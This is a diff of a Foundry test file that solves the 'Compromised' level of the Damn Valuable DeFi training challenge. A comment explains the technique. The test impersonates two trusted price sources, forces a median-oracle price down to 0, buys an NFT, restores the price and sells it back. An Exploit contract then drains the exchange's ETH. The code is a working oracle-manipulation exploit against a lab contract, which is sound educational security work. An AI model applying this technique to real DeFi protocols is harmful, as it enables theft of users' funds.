@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -19,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant INITIAL_NFT_PRICE = 999 ether;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
-
 
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
@@ -72,10 +72,41 @@ contract CompromisedChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * The challenge involves an exchange that sells NFTs called “DVNFT” whose price is determined by an on‐chain oracle. 
+     * The oracle aggregates price data from three trusted sources and uses the median value. 
+     * The intended assumption is that at least two of the three sources are honest. 
+     * However, if an attacker compromises two trusted sources, they can arbitrarily control the NFT’s price.
+     * By making two sources report a very low price (e.g., 0), the median price will become very low, regardless of what the third honest source reports.
+     * 
+     * By manipulating the oracle price, an attacker can:
+     * Buy NFTs cheaply: Reduce the price to near zero, buy NFTs from the exchange for almost nothing.
+     * Sell NFTs expensively: Increase the price to a very high value, sell the cheaply acquired NFTs back to the exchange for a huge profit (draining the exchange's ETH reserves).
      */
     function test_compromised() public checkSolved {
-        
+        Exploit exploit = new Exploit{value: address(this).balance}(oracle, exchange, nft, recovery);
+
+        // Phase 1: Lower the price by compromising sources 0 and 1
+        vm.startPrank(sources[0]); // Start impersonating source[0]
+        oracle.postPrice(symbols[0], 0); // Source[0] reports price 0
+        vm.stopPrank(); // Stop impersonating source[0]
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+        vm.stopPrank();
+
+        exploit.buy(); // Player buys an NFT at the manipulated low price
+
+        // Phase 2: Restore the price and sell for profit
+        vm.startPrank(sources[0]); // Start impersonating source[0] again
+        oracle.postPrice(symbols[0], 999 ether); // Source[0] reports original high price
+        vm.stopPrank(); // Stop impersonating source[0]
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.stopPrank();
+
+        exploit.sell(); // Player sells the NFT back to the exchange at the high price
+        exploit.recover(999 ether); // Transfers the drained ETH to the recovery address
     }
 
     /**
@@ -94,4 +125,48 @@ contract CompromisedChallenge is Test {
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+}
+
+contract Exploit is IERC721Receiver {
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint256 nftId;
+    address recovery;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function buy() external payable {
+        // Send minimal ETH to buy (price should be near 0)
+        uint256 _nftId = exchange.buyOne{value: 1}();
+        nftId = _nftId;
+    }
+    
+
+    function sell() external payable {
+        // Approve Exchange to transfer the NFT
+        nft.approve(address(exchange), nftId);
+        // Sell the NFT back to the Exchange
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint256 amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    // Standard ERC721 receiver implementation
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
+        return this.onERC721Received.selector;
+    }
+
+    // Payable receive function for contract to receive ETH
+    receive() external payable {}
 }
